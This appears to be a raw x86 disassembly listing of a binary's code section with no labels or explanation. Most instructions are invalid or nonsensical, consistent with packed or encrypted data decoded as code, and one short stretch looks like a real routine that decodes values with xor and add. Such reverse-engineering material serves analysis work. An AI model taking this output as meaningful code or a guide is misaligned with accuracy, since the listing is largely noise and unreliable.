  4028e8:	dec    ecx
  4028e9:	sub    al,0xa7
  4028eb:	fwait
  4028ec:	repnz retf 0x8a69
  4028f0:	outs   dx,BYTE PTR ds:[esi]
  4028f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4028f2:	nop
  4028f3:	pop    edi
  4028f4:	jo     0x402965
  4028f6:	cmp    eax,0xaa4d1fe1
  4028fb:	jmp    0x12ad:0xda0f41a9
  402902:	out    0x88,eax
  402904:	mov    ch,0x90
  402906:	push   ecx
  402907:	mov    ch,0x97
  402909:	(bad)  
  40290a:	pusha  
  40290b:	imul   eax,DWORD PTR [eax-0x4f08b98f],0x92fc6e24
  402915:	pop    esi
  402916:	sub    eax,0x8f091396
  40291b:	xlat   BYTE PTR ds:[ebx]
  40291c:	push   0xb50f4623
  402921:	xchg   edx,eax
  402922:	mov    ch,0x41
  402924:	jno    0x40290e
  402926:	fdivp  st(7),st
  402928:	retf   0x1ce7
  40292b:	ret    
  40292c:	mov    esp,0x3a73d501
  402931:	sbb    edx,DWORD PTR [edi-0x1e]
  402934:	add    DWORD PTR [esi+0x3d],0xfffffff8
  402938:	push   edi
  402939:	mov    al,ds:0x8e4cbf25
  40293e:	repz mov dh,0xd9
  402941:	mov    eax,ds:0xc40a0cd9
  402946:	aam    0x19
  402948:	pop    es
  402949:	data16 or BYTE PTR [esi-0x27fb469d],0x35
  402951:	jecxz  0x402943
  402953:	and    eax,0x7a7e5e0f
  402958:	and    esi,ebx
  40295a:	rol    DWORD PTR [ebp-0x177efeb6],1
  402960:	sub    eax,0x2714e34e
  402965:	fdiv   st,st(2)
  402967:	inc    esi
  402968:	mov    edi,0x1014293f
  40296d:	fidiv  WORD PTR [ecx-0x50]
  402970:	sbb    eax,DWORD PTR [edi+0x7]
  402973:	add    bl,bl
  402975:	bound  ebp,QWORD PTR [ecx]
  402977:	sahf   
  402978:	cdq    
  402979:	adc    DWORD PTR [ebx+0x5c],eax
  40297c:	sub    eax,0xe2828b8a
  402981:	pop    edi
  402982:	pusha  
  402983:	jb     0x402945
  402985:	mov    ch,0xae
  402987:	sub    eax,0x2530986b
  40298c:	test   BYTE PTR [eax],ah
  40298e:	mov    al,ss:0x343afee8
  402994:	pop    es
  402995:	adc    edx,esp
  402997:	loopne 0x4029ae
  402999:	(bad)  
  40299a:	out    dx,al
  40299b:	adc    DWORD PTR [ebp+edi*8+0x1081275b],ebx
  4029a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4029a3:	iret   
  4029a4:	into   
  4029a5:	jmp    0x4029cf
  4029a7:	jp     0x4029c1
  4029a9:	jg     0x402953
  4029ab:	arpl   WORD PTR [esi+0x56],ax
  4029ae:	repz inc esi
  4029b0:	adc    eax,0x11336e01
  4029b5:	inc    ebx
  4029b6:	pushf  
  4029b7:	mov    ebx,DWORD PTR [edx-0x6d]
  4029ba:	bound  edi,QWORD PTR [ecx]
  4029bc:	out    0x10,al
  4029be:	mov    al,0xca
  4029c0:	jno    0x40295d
  4029c2:	retf   
  4029c3:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  4029c5:	add    edi,DWORD PTR [esi-0x3f9efe0b]
  4029cb:	call   0xb20237c6
  4029d0:	dec    esi
  4029d1:	pushf  
  4029d2:	add    DWORD PTR [esi+0x6e5b0d0e],esi
  4029d8:	mov    edi,0xea2593e
  4029dd:	daa    
  4029de:	mov    dl,0x52
  4029e0:	inc    edi
  4029e1:	push   ebp
  4029e2:	xor    cl,BYTE PTR [ebp-0xbcd9d97]
  4029e8:	push   ss
  4029e9:	cmp    BYTE PTR [edi-0x640cba5f],cl
  4029ef:	push   es
  4029f0:	fsub   st,st(2)
  4029f2:	inc    edi
  4029f3:	jmp    0x5d25caef
  4029f8:	cmp    WORD PTR [ecx-0x2f69fe29],bx
  4029ff:	mov    WORD PTR [eax-0x1d],ax
  402a03:	mov    ds:0x1f8abe8c,eax
  402a08:	mov    al,ds:0x6c8523f1
  402a0d:	fisttp WORD PTR [edx+0x2a]
  402a10:	inc    ebp
  402a11:	mov    ebp,0xafffafd0
  402a16:	loop   0x402a71
  402a18:	push   ecx
  402a19:	inc    ecx
  402a1a:	inc    esp
  402a1b:	cli    
  402a1c:	(bad)  
  402a1d:	fwait
  402a1e:	aaa    
  402a1f:	ror    BYTE PTR [ebx],cl
  402a21:	scas   al,BYTE PTR es:[edi]
  402a22:	sbb    eax,0xa40b6d7a
  402a27:	ret    0xfacd
  402a2a:	rcl    DWORD PTR [edx+0x285acf74],1
  402a30:	xor    ch,BYTE PTR [esi-0x6b6e6d7b]
  402a36:	ins    BYTE PTR es:[edi],dx
  402a37:	ds push cs
  402a39:	outs   dx,DWORD PTR ds:[esi]
  402a3a:	call   0x7076fcda
  402a3f:	pop    edi
  402a40:	sti    
  402a41:	xchg   ebp,eax
  402a42:	xor    BYTE PTR [esi-0x5895cb30],0xf6
  402a49:	cli    
  402a4a:	test   dh,cl
  402a4c:	aaa    
  402a4d:	push   edx
  402a4e:	sub    eax,0x2a3231a8
  402a53:	mov    eax,0x2cb7b0ce
  402a58:	mov    edx,0x848a72f7
  402a5d:	add    ebp,DWORD PTR [ecx+esi*2+0x51]
  402a61:	mov    BYTE PTR [esi-0x2ee7721],0x17
  402a68:	inc    ebp
  402a69:	mov    edi,0x3bc5f3f1
  402a6e:	fadd   QWORD PTR ds:0xc3e10c70
  402a74:	ficomp WORD PTR [edx+0x86729ff]
  402a7a:	ss mov ebp,0x9fd35d65
  402a80:	outs   dx,DWORD PTR ds:[esi]
  402a81:	pushf  
  402a82:	push   es
  402a83:	mov    edi,0x7756dc94
  402a88:	iret   
  402a89:	inc    edi
  402a8a:	or     BYTE PTR [esi-0x10cbbe1],cl
  402a90:	test   DWORD PTR [ecx],esi
  402a92:	cmp    eax,esp
  402a94:	lods   eax,DWORD PTR ds:[esi]
  402a95:	add    BYTE PTR [eax],ah
  402a97:	and    DWORD PTR [esi-0x7a8c5477],edx
  402a9d:	call   FWORD PTR [edi]
  402a9f:	mov    eax,ds:0x26ed2c7f
  402aa4:	pop    esp
  402aa5:	add    DWORD PTR [ecx],edi
  402aa7:	mov    ?,WORD PTR [edi+0x26]
  402aaa:	sti    
  402aab:	cld    
  402aac:	xor    esp,ebx
  402aae:	pop    eax
  402aaf:	aas    
  402ab0:	inc    ebx
  402ab1:	or     BYTE PTR [esi+0x2e],al
  402ab4:	hlt    
  402ab5:	mov    dl,0x5a
  402ab7:	ds jbe 0x402ab6
  402aba:	mov    ch,0x51
  402abc:	cmp    esp,DWORD PTR [ebp-0x6a8579ad]
  402ac2:	mov    dl,0x9e
  402ac4:	or     BYTE PTR [edi+0x3aac859b],0xf7
  402acb:	rcl    dh,cl
  402acd:	ret    0x29fc
  402ad0:	adc    DWORD PTR [edi-0x22],esp
  402ad3:	pop    ss
  402ad4:	push   edi
  402ad5:	jnp    0x402b06
  402ad7:	fild   DWORD PTR [eax-0x64b2e72f]
  402add:	cs mov esi,0xe91c8132
  402ae3:	std    
  402ae4:	and    bl,dh
  402ae6:	add    ah,BYTE PTR [ecx-0x3a86439d]
  402aec:	(bad)  
  402aed:	ja     0x402ae1
  402aef:	repz xchg ebp,eax
  402af1:	icebp  
  402af2:	push   eax
  402af3:	xchg   edx,eax
  402af4:	pushf  
  402af5:	push   ebx
  402af6:	cli    
  402af7:	jl     0x402a8f
  402af9:	std    
  402afa:	pop    esi
  402afb:	sub    edi,eax
  402afd:	call   0x94dd28a9
  402b02:	sbb    al,0xd0
  402b04:	pop    ds
  402b05:	jg     0x402b09
  402b07:	out    dx,al
  402b08:	repz (bad) 
  402b0a:	popa   
  402b0b:	adc    eax,0xec3e1d61
  402b10:	push   ss
  402b11:	mov    al,ds:0xa7a0257d
  402b16:	xor    eax,0xf251d31c
  402b1b:	imul   ecx,edi,0x55
  402b1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b1f:	in     eax,0xdd
  402b21:	scas   eax,DWORD PTR es:[edi]
  402b22:	rol    ecx,0x31
  402b25:	add    ebp,DWORD PTR [edi-0x4f]
  402b28:	push   ds
  402b29:	sub    al,bl
  402b2b:	hlt    
  402b2c:	pop    ds
  402b2d:	adc    ebp,edx
  402b2f:	popa   
  402b30:	xchg   esp,eax
  402b31:	psrld  mm2,mm6
  402b34:	push   ecx
  402b35:	or     DWORD PTR [ebp-0x80],ebp
  402b38:	loop   0x402aba
  402b3a:	ret    0xc025
  402b3d:	lods   eax,DWORD PTR ds:[esi]
  402b3e:	and    ebx,DWORD PTR [esi+0x75]
  402b41:	das    
  402b42:	push   ds
  402b43:	test   al,0xee
  402b45:	xor    BYTE PTR [ebp-0x1b4cd189],ah
  402b4b:	adc    edi,edi
  402b4d:	stos   BYTE PTR es:[edi],al
  402b4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402b4f:	ror    BYTE PTR [esi+0x72],1
  402b52:	xchg   ecx,eax
  402b53:	mov    bh,0x98
  402b55:	ror    ah,cl
  402b57:	call   0x44b9:0xee1b5c3e
  402b5e:	cmc    
  402b5f:	hlt    
  402b60:	cs mov al,0x7c
  402b63:	push   ds
  402b64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402b65:	lahf   
  402b66:	inc    edi
  402b67:	retf   0xa330
  402b6a:	test   BYTE PTR [bp+di-0x637f],0x5e
  402b70:	pop    ecx
  402b71:	xor    DWORD PTR [ebx+0x7664eab],esp
  402b77:	or     BYTE PTR [edi],0xb0
  402b7a:	iret   
  402b7b:	int    0xaf
  402b7d:	push   esi
  402b7e:	std    
  402b7f:	add    BYTE PTR [edi],bl
  402b81:	jp     0x402b64
  402b83:	rol    BYTE PTR [ebp+eiz*1+0x228bae50],1
  402b8a:	je     0x402b28
  402b8c:	or     al,0x98
  402b8e:	pop    ecx
  402b8f:	jmp    0xe967:0x8378b020
  402b96:	cmc    
  402b97:	std    
  402b98:	mov    dh,0x5f
  402b9a:	clc    
  402b9b:	mov    al,0x1e
  402b9d:	data16 loop 0x402b6c
  402ba0:	or     esp,esi
  402ba2:	mov    eax,DWORD PTR [ebp*1+0x290ef878]
  402ba9:	imul   ebp
  402bab:	jno    0x402c0c
  402bad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402bae:	pop    esi
  402baf:	je     0x402bea
  402bb1:	in     eax,dx
  402bb2:	push   esp
  402bb3:	or     DWORD PTR [ecx],ecx
  402bb5:	arpl   WORD PTR [edi],si
  402bb7:	mov    ss,WORD PTR [ebp-0x71]
  402bba:	mov    edx,0x46d8aada
  402bbf:	push   esp
  402bc0:	(bad)  
  402bc1:	scas   al,BYTE PTR es:[edi]
  402bc2:	mov    ebp,0xa5dd0cd5
  402bc7:	in     al,0x96
  402bc9:	sti    
  402bca:	cmp    edx,esi
  402bcc:	mov    cl,ah
  402bce:	push   edi
  402bd0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402bd1:	jb     0x402b74
  402bd3:	xlat   BYTE PTR ds:[ebx]
  402bd4:	popf   
  402bd5:	jns    0x402bc9
  402bd7:	ins    DWORD PTR es:[edi],dx
  402bd8:	dec    esi
  402bd9:	mov    esp,DWORD PTR [edx+0x360979cd]
  402bdf:	cmp    al,0xad
  402be1:	cmp    esp,eax
  402be3:	cmp    al,0xae
  402be5:	(bad)  [esi*8+0x385f8eee]
  402bec:	jae    0x402ba4
  402bee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402bef:	(bad)  
  402bf1:	call   0x805aad40
  402bf6:	std    
  402bf7:	gs mov ah,0x31
  402bfa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402bfb:	imul   ebx,DWORD PTR [edx-0x29],0xffffffba
  402bff:	inc    eax
  402c00:	cli    
  402c01:	in     al,dx
  402c02:	stc    
  402c03:	sub    DWORD PTR [eax+0x1],0x3d
  402c07:	fld    QWORD PTR [ebp+0x66]
  402c0a:	aad    0x7e
  402c0c:	stc    
  402c0d:	xchg   ecx,eax
  402c0e:	loope  0x402c41
  402c10:	cdq    
  402c11:	enter  0x6cf8,0x7e
  402c15:	popa   
  402c16:	or     DWORD PTR [edx],edi
  402c18:	data16 mov dl,0xd6
  402c1b:	sbb    al,0xca
  402c1d:	xchg   dl,bh
  402c1f:	jns    0x402bba
  402c21:	add    BYTE PTR [ebp+0xf30f906],ch
  402c27:	cwde   
  402c28:	push   ebp
  402c29:	sbb    al,0x14
  402c2b:	lea    ecx,[ebp-0x9]
  402c2e:	sbb    dl,BYTE PTR [eax+0x59]
  402c31:	xchg   edi,eax
  402c32:	pop    ecx
  402c33:	pop    ecx
  402c34:	inc    esi
  402c35:	cmp    DWORD PTR fs:[eax-0x4e],0xf0a369d5
  402c3d:	ret    
  402c3e:	cmp    BYTE PTR [edi+eiz*2],ah
  402c41:	cmp    al,0x2b
  402c43:	jae    0x402cb0
  402c45:	and    bh,BYTE PTR [esi]
  402c47:	or     al,0x76
  402c49:	jne    0x402c77
  402c4b:	xchg   bh,dl
  402c4d:	cmp    DWORD PTR [ebx],edi
  402c4f:	add    eax,0xc6c9c5bc
  402c54:	jg     0x402c76
  402c56:	push   ecx
  402c57:	das    
  402c58:	pop    esp
  402c59:	call   0xa0fb:0x21d4e3c9
  402c60:	mov    WORD PTR [esi-0x71],cs
  402c63:	cwde   
  402c64:	push   eax
  402c65:	adc    DWORD PTR [ebx],ecx
  402c67:	cmp    al,0xf2
  402c69:	push   ecx
  402c6a:	cmp    al,0x87
  402c6c:	ret    0x5972
  402c6f:	xor    bl,BYTE PTR [ebp-0x20d7512d]
  402c75:	test   DWORD PTR [edx-0x4c96887b],ebp
  402c7b:	push   0xffffffb4
  402c7d:	adc    ebp,DWORD PTR [edx-0x1f]
  402c80:	in     al,0xc6
  402c82:	pusha  
  402c83:	mov    esi,0xb48dcc25
  402c88:	test   eax,0x41727af2
  402c8d:	and    BYTE PTR [eax-0x31de987a],dl
  402c93:	adc    DWORD PTR [esp+eiz*4+0x25],edx
  402c97:	mov    BYTE PTR [eax-0x13],ch
  402c9a:	div    BYTE PTR [ebx+ebx*8]
  402c9d:	in     al,dx
  402c9e:	ins    BYTE PTR es:[edi],dx
  402c9f:	lock fcomp DWORD PTR [ecx+0x1c]
  402ca3:	ins    BYTE PTR es:[edi],dx
  402ca4:	add    ah,al
  402ca6:	rcl    BYTE PTR [edi-0x48],cl
  402ca9:	or     DWORD PTR [ebp-0x32],0xffffffea
  402cad:	add    eax,0x48ac3b35
  402cb2:	and    eax,0x63adc0e1
  402cb7:	inc    esp
  402cb8:	test   ah,dl
  402cba:	cmp    eax,0x600d4f96
  402cbf:	add    eax,0xaa
  402cc4:	push   eax
  402cc5:	mov    eax,DWORD PTR [ebp-0x18]
  402cc8:	mov    eax,DWORD PTR [eax+0x198]
  402cce:	push   DWORD PTR [eax]
  402cd0:	call   0x40c099
  402cd5:	mov    DWORD PTR [ebp-0x4],eax
  402cd8:	cmp    DWORD PTR [ebp-0x4],0x0
  402cdc:	lea    eax,[ebp+0x4]
  402cdf:	mov    DWORD PTR [ebp-0x38],eax
  402ce2:	je     0x404656
  402ce8:	lea    eax,[ebp-0xc]
  402ceb:	mov    DWORD PTR [ebp-0x30],eax
  402cee:	mov    eax,DWORD PTR [ebp-0x4c]
  402cf1:	xor    eax,esi
  402cf3:	add    eax,edi
  402cf5:	mov    DWORD PTR [ebp-0x34],eax
  402cf8:	mov    eax,DWORD PTR [ebp-0x28]
  402cfb:	xor    eax,esi
  402cfd:	add    eax,edi
  402cff:	mov    DWORD PTR [ebp-0x20],eax
  402d02:	mov    eax,DWORD PTR [ebp-0x4]
  402d05:	mov    DWORD PTR [ebp-0x24],eax
  402d08:	lea    eax,[ebp-0x98]
  402d0e:	mov    DWORD PTR [ebp-0x8],eax
  402d11:	mov    eax,DWORD PTR [ebp-0x10]
  402d14:	mov    DWORD PTR [ebp-0x10],eax
  402d17:	mov    eax,DWORD PTR [ebp-0x1c]
  402d1a:	mov    DWORD PTR [ebp-0x40],ebx
  402d1d:	mov    DWORD PTR [ebp-0x2c],eax
  402d20:	mov    eax,DWORD PTR [ebp-0x40]
  402d23:	mov    ecx,DWORD PTR [ebp-0x8]
  402d26:	xor    eax,esi
  402d28:	add    eax,0x32729b
  402d2d:	jmp    0x40313b
  402d32:	stos   DWORD PTR es:[edi],eax
  402d33:	addr16 clc 
  402d35:	in     eax,0x50
  402d37:	loope  0x402dac
  402d39:	jno    0x402d4f
  402d3b:	jo     0x402d34
  402d3d:	fs push es
  402d3f:	or     DWORD PTR [ecx+0x7e099801],ebp
  402d45:	jle    0x402db6
  402d47:	jge    0x402dc7
  402d49:	jle    0x402d75
  402d4b:	cmp    BYTE PTR [ecx+0x36],bl
  402d4e:	es dec eax
  402d50:	sbb    ax,0xf7d5
  402d54:	push   ss
  402d55:	in     eax,0xf6
  402d57:	out    0x79,eax
  402d59:	es cs push es
  402d5c:	inc    esi
  402d5d:	sub    eax,0x396ad129
  402d62:	(bad)  
  402d63:	in     eax,dx
  402d64:	jecxz  0x402d2b
  402d66:	and    ecx,DWORD PTR [edx+0x32c1d630]
  402d6c:	or     eax,edi
  402d6e:	lahf   
  402d6f:	pop    edi
  402d70:	ret    
  402d71:	mov    es,WORD PTR [edi+0x2ec908f0]
  402d77:	mov    bh,BYTE PTR [eax+0x4a]
  402d7a:	stos   DWORD PTR es:[edi],eax
  402d7b:	pop    eax
  402d7c:	and    al,0xd0
  402d7e:	and    al,0xa6
  402d80:	ficomp WORD PTR [ecx-0xd]
  402d83:	ins    DWORD PTR es:[edi],dx
  402d84:	mov    ecx,0x19195ed3
  402d89:	sub    eax,0xfe92fdcf
  402d8e:	push   edi
  402d8f:	push   ecx
  402d90:	xlat   BYTE PTR ds:[ebx]
  402d91:	shl    edi,1
  402d93:	call   0x6c247c00
  402d98:	jno    0x402dd0
  402d9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402d9b:	retf   
  402d9c:	test   al,0xf4
  402d9e:	pop    ebx
  402d9f:	xor    BYTE PTR [esi],0xc7
  402da2:	and    eax,0x81981ef2
  402da7:	mov    bl,0xac
  402da9:	and    al,0x4
  402dab:	cmp    al,0x45
  402dad:	or     eax,0xe7933a6
  402db2:	jecxz  0x402d39
  402db4:	mov    ds:0xfd0683b2,al
  402db9:	sbb    DWORD PTR [ebx+0x271672bf],ebx
  402dbf:	lods   eax,DWORD PTR ds:[esi]
  402dc0:	faddp  st(7),st
  402dc2:	pop    ecx
  402dc3:	es int 0xa2
  402dc6:	sbb    BYTE PTR [ecx-0x71],dl
  402dc9:	inc    ebp
  402dca:	out    0x60,al
  402dcc:	test   eax,0x68ac67d5
  402dd1:	out    dx,eax
  402dd2:	add    cl,BYTE PTR [ebx+ebp*1]
  402dd5:	add    edi,esp
  402dd7:	and    BYTE PTR [edx+0x45e987ce],0x6d
  402dde:	test   al,0xf5
  402de0:	mov    cl,0x3e
  402de2:	mov    bh,0x29
  402de4:	pop    ecx
  402de5:	xchg   esi,eax
  402de6:	pop    ebx
  402de7:	les    eax,FWORD PTR ds:0x904b00ae
  402ded:	xchg   esi,eax
  402dee:	jno    0x402d8c
  402df0:	rcr    DWORD PTR [esp+edx*8],1
  402df3:	xor    edx,edi
  402df5:	(bad)  
  402df6:	(bad)  
  402df7:	jge    0x402e69
  402df9:	push   eax
  402dfa:	add    DWORD PTR [ebx+ecx*8],ebp
  402dfd:	es xchg ebx,eax
  402dff:	test   DWORD PTR [ebx+0x3c],0x311e8396
  402e06:	push   ss
  402e07:	mov    dh,bh
  402e09:	adc    DWORD PTR [ebx-0x37],eax
  402e0c:	mov    al,0x26
  402e0e:	stc    
  402e0f:	push   0xc8efab05
  402e14:	jg     0x402e8e
  402e16:	inc    edx
  402e17:	dec    esi
  402e18:	dec    BYTE PTR [esi]
  402e1a:	inc    edi
  402e1b:	out    0x9f,eax
  402e1d:	(bad)  
  402e1e:	xchg   ecx,eax
  402e1f:	je     0x402e2a
  402e21:	pop    esp
  402e22:	stc    
  402e23:	mov    ah,0x67
  402e25:	daa    
  402e26:	sti    
  402e27:	mov    esp,0x6cc65c5a
  402e2c:	xor    bh,BYTE PTR [edi]
  402e2e:	or     eax,0x6e999ef1
  402e33:	mul    bl
  402e35:	fcomp  DWORD PTR [edx]
  402e37:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  402e39:	nop
  402e3a:	(bad)  
  402e3c:	or     al,dh
  402e3e:	adc    bl,0x53
  402e41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402e42:	and    eax,0xf0c50c61
  402e47:	xor    BYTE PTR [edi],cl
  402e49:	cmp    dl,BYTE PTR [ecx]
  402e4b:	dec    ebp
  402e4c:	add    al,0xf3
  402e4e:	mov    edi,0xa99a60ff
  402e53:	sub    bl,bh
  402e55:	add    DWORD PTR [esi-0x61],ebx
  402e58:	sub    eax,0x8763c278
  402e5d:	xor    cl,BYTE PTR [ecx+0x737ab003]
  402e63:	jbe    0x402de7
  402e65:	and    ebx,edx
  402e67:	or     BYTE PTR [edx+0x1cc7af72],ah
  402e6d:	lods   eax,DWORD PTR ds:[esi]
  402e6e:	int3   
  402e6f:	mov    BYTE PTR [edx-0x5e],dh
  402e72:	xchg   ebx,eax
  402e73:	mov    ds:0xeaff4c17,al
  402e78:	retf   0xb3ef
  402e7b:	arpl   WORD PTR [edx],bx
  402e7d:	inc    ebx
  402e7e:	sbb    edx,esp
  402e80:	repnz push ds
  402e82:	xchg   ecx,eax
  402e83:	enter  0xf8cb,0x95
  402e87:	sub    BYTE PTR [eax-0x72],dl
  402e8a:	and    esp,edi
  402e8c:	jbe    0x402e43
  402e8e:	addr16 (bad) 
  402e91:	loope  0x402e49
  402e93:	pop    edx
  402e94:	pushf  
  402e95:	push   edi
  402e96:	ss jp  0x402e3a
  402e99:	jae    0x402e31
  402e9b:	pop    esi
  402e9c:	sbb    BYTE PTR [eax],dh
  402e9e:	jp     0x402f19
  402ea0:	pusha  
  402ea1:	cwde   
  402ea2:	out    dx,al
  402ea3:	gs int3 
  402ea5:	add    edi,DWORD PTR [ecx]
  402ea7:	inc    eax
  402ea8:	and    eax,ebx
  402eaa:	(bad)  
  402eab:	call   0xcaaa48f
  402eb0:	sub    al,0x80
  402eb2:	jnp    0x402e78
  402eb4:	sub    dl,BYTE PTR [esi*8-0x6563f59d]
  402ebb:	pop    ebx
  402ebc:	int    0x5a
  402ebe:	stos   DWORD PTR es:[edi],eax
  402ebf:	aad    0xf3
  402ec1:	in     eax,0xa4
  402ec3:	leave  
  402ec4:	and    DWORD PTR [edi],ebx
  402ec6:	and    ch,BYTE PTR [ecx+0x71ccb1f7]
  402ecc:	xor    esi,DWORD PTR [ecx+0x6f215501]
  402ed2:	aad    0xf7
  402ed4:	pop    ecx
  402ed5:	sbb    bl,BYTE PTR [edi-0x76]
  402ed8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402ed9:	add    BYTE PTR [esi],bl
  402edb:	hlt    
  402edc:	dec    DWORD PTR [edi-0x37bf51a9]
  402ee2:	jnp    0x402f3e
  402ee4:	xchg   eax,ecx
  402ee6:	mov    bl,0x5b
  402ee8:	aaa    
  402ee9:	data16 add bh,BYTE PTR [esi+0x7]
  402eed:	xor    al,0x19
  402eef:	jg     0x402eaa
  402ef1:	stos   DWORD PTR es:[edi],eax
  402ef2:	imul   ebp,edi,0xffffff92
  402ef5:	mov    cl,ah
  402ef7:	fucomp st(2)
  402ef9:	jbe    0x402f11
  402efb:	das    
  402efc:	out    0x45,eax
  402efe:	dec    ecx
  402eff:	dec    ecx
  402f00:	add    DWORD PTR [eax],edx
  402f02:	pop    edi
  402f03:	mov    ch,BYTE PTR [ebp-0x3c]
  402f06:	and    eax,0x45f3e674
  402f0b:	iret   
  402f0c:	dec    ebx
  402f0d:	xchg   DWORD PTR [ecx],ecx
  402f0f:	sbb    edx,ebp
  402f11:	mov    ds:0xa690fc93,eax
  402f16:	mov    edx,esi
  402f18:	cs xchg ecx,eax
  402f1a:	loope  0x402f4e
  402f1c:	pop    ebp
  402f1d:	mov    edx,0x9e8fb349
  402f22:	pop    ss
  402f23:	test   DWORD PTR cs:[ebx-0x40],ebp
  402f27:	les    esp,FWORD PTR [edx+ebx*1-0x50]
  402f2b:	adc    DWORD PTR [edi],esi
  402f2d:	sub    ch,BYTE PTR [edi+0x1f]
  402f30:	jo     0x402f4e
  402f32:	mov    ebx,0xde712ac9
  402f37:	dec    esp
  402f38:	lahf   
  402f39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f3a:	gs xchg ecx,eax
  402f3c:	(bad)  
  402f3d:	stc    
  402f3e:	and    cl,BYTE PTR [ebp+edi*4-0x20]
  402f42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f43:	sbb    ebp,DWORD PTR [ecx+0xa8d1bad]
  402f49:	aam    0x6e
  402f4b:	xchg   ecx,eax
  402f4c:	test   cl,ch
  402f4e:	mov    BYTE PTR [edx+eax*1-0xd],bh
  402f52:	aam    0x3e
  402f54:	stos   DWORD PTR es:[edi],eax
  402f55:	adc    ebp,DWORD PTR [eax]
  402f57:	mov    ch,0xae
  402f59:	lods   eax,DWORD PTR ds:[esi]
  402f5a:	fs ret 0x1571
  402f5e:	xor    edx,esi
  402f60:	pop    esi
  402f61:	add    al,0x72
  402f63:	push   ecx
  402f64:	lods   al,BYTE PTR ds:[esi]
  402f65:	xchg   ebx,eax
  402f66:	mov    ebx,0x818989a3
  402f6b:	enter  0x84b1,0x81
  402f6f:	ins    DWORD PTR es:[edi],dx
  402f70:	scas   al,BYTE PTR es:[edi]
  402f71:	mov    cl,0x48
  402f73:	mov    eax,0x6fd13d1
  402f78:	shl    ebp,0xbe
  402f7b:	jge    0x402f24
  402f7d:	add    al,0xef
  402f7f:	xchg   edx,eax
  402f80:	out    dx,al
  402f81:	mul    DWORD PTR [edx+0x7f9eb7cf]
  402f87:	and    BYTE PTR [ebx-0x6c36a306],bl
  402f8d:	out    dx,eax
  402f8e:	or     bh,dh
  402f90:	push   ebx
  402f91:	pop    esp
  402f92:	or     eax,0x3a0cad8c
  402f97:	xlat   BYTE PTR ds:[ebx]
  402f98:	out    0x6f,al
  402f9a:	or     dh,BYTE PTR [ecx-0x519e5585]
  402fa0:	arpl   WORD PTR [bp+si],di
  402fa3:	jp     0x40301f
  402fa5:	jg     0x402fcb
  402fa7:	cmp    eax,esp
  402fa9:	add    al,0x4a
  402fab:	clc    
  402fac:	out    0xdc,al
  402fae:	adc    DWORD PTR [esi+edx*1+0x4cb9ff36],0x132afea3
  402fb9:	(bad)  
  402fba:	jmp    0x40303b
  402fbc:	mov    ds:0xc49dcad,al
  402fc1:	mov    ebx,0xcd808d25
  402fc6:	cmc    
  402fc7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402fc8:	ins    BYTE PTR es:[edi],dx
  402fc9:	and    al,0x80
  402fcb:	mov    ah,BYTE PTR [ebp+edx*1+0x5bf1d30]
  402fd2:	ja     0x40301d
  402fd4:	xchg   esi,eax
  402fd5:	xor    esp,DWORD PTR [esi+0x6c]
  402fd8:	dec    eax
  402fd9:	out    dx,al
  402fda:	pop    es
  402fdb:	rcr    bl,0x94
  402fde:	rol    DWORD PTR ds:0x476e2660,cl
  402fe4:	enter  0xdc07,0x94
  402fe8:	fdiv   DWORD PTR [esi-0x4dc485bf]
  402fee:	sar    esi,cl
  402ff0:	(bad)  
  402ff1:	push   ebx
  402ff2:	imul   ecx,ebp,0x2a
  402ff5:	add    BYTE PTR ds:0xd6c8d48,bh
  402ffb:	add    DWORD PTR [edi],esi
  402ffd:	add    ecx,DWORD PTR [edi+0xfc27e6]
  403003:	dec    edi
  403004:	mov    edx,0x7faa038b
  403009:	sbb    edx,esp
  40300b:	sub    al,0xaf
  40300d:	fucom  st(1)
  40300f:	sbb    ebx,DWORD PTR ds:0x6148a306
  403015:	inc    edx
  403016:	inc    eax
  403017:	xlat   BYTE PTR ds:[ebx]
  403018:	mov    eax,0xe6c2e634
  40301e:	mul    BYTE PTR cs:[esi]
  403021:	add    eax,0x9f84f4a9
  403026:	jb     0x40306f
  403028:	mov    ah,0xf9
  40302a:	scas   al,BYTE PTR es:[edi]
  40302b:	xor    DWORD PTR [esi],edi
  40302d:	dec    eax
  40302e:	addr16 ss lahf 
  403031:	cmc    
  403032:	push   ecx
  403033:	mov    eax,ds:0x3ab1bc3e
  403038:	pop    ecx
  403039:	push   edx
  40303a:	outs   dx,DWORD PTR ds:[esi]
  40303b:	sub    dh,BYTE PTR ds:0xb9b73468
  403041:	sti    
  403042:	jle    0x403041
  403044:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403045:	(bad)  
  403046:	lock push 0x362706a9
  40304c:	jno    0x40304c
  40304e:	dec    esp
  40304f:	push   ebx
  403050:	lahf   
  403051:	test   eax,0x2fa08e42
  403056:	sbb    eax,0x561a3eb4
  40305b:	lds    ecx,FWORD PTR [eax]
  40305d:	xchg   BYTE PTR [eax-0x4fffe0d],ch
  403063:	lods   eax,DWORD PTR ds:[esi]
  403064:	enter  0x5191,0xe4
  403068:	adc    eax,0xfda2ce02
  40306d:	adc    edi,DWORD PTR [eax]
  40306f:	les    esp,FWORD PTR [edx-0x5a]
  403072:	cmp    ch,dh
  403074:	xchg   edx,eax
  403075:	push   cs
  403076:	pop    es
  403077:	ins    DWORD PTR es:[edi],dx
  403078:	aad    0xe6
  40307a:	iret   
  40307b:	aaa    
  40307c:	in     eax,dx
  40307d:	mov    eax,0xc1c0bf44
  403082:	mov    esi,0xae8f02e0
  403087:	push   0x266d9918
  40308c:	sub    eax,0xe6d47715
